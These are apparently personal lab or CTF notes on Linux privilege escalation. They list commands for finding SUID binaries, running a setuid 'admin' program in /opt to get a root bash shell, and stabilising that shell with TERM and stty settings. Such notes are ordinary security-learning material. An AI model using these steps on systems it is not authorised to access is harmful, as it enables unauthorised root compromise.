# Privilege Escalation

## Introduction

These are just side notes i took during my process when i was using a SUID exploit for priv esc.


Check for SUID's. You can also check the /opt directory look for newer files.


### (VICTIM))

```
find / -perm -u=s -type f 2>/dev/null | xargs ls -l
```

```
cd /opt
```

```
ls
```

```
cat admin.c
```

```
./admin
```

```
(upgrade your shell)
```

```
/bin/bash
```

```
(fix size of your TERM)
```

```
export TERM=xterm-256color
```

### (ATTACKER) 

```
echo $TERM && tput lines && tput cols 
```

### (VICTIM) 

```
stty rows 27 columns 77 
```

```
id
```

```
/bin/bash 
```

(Should be "root@App1" now)

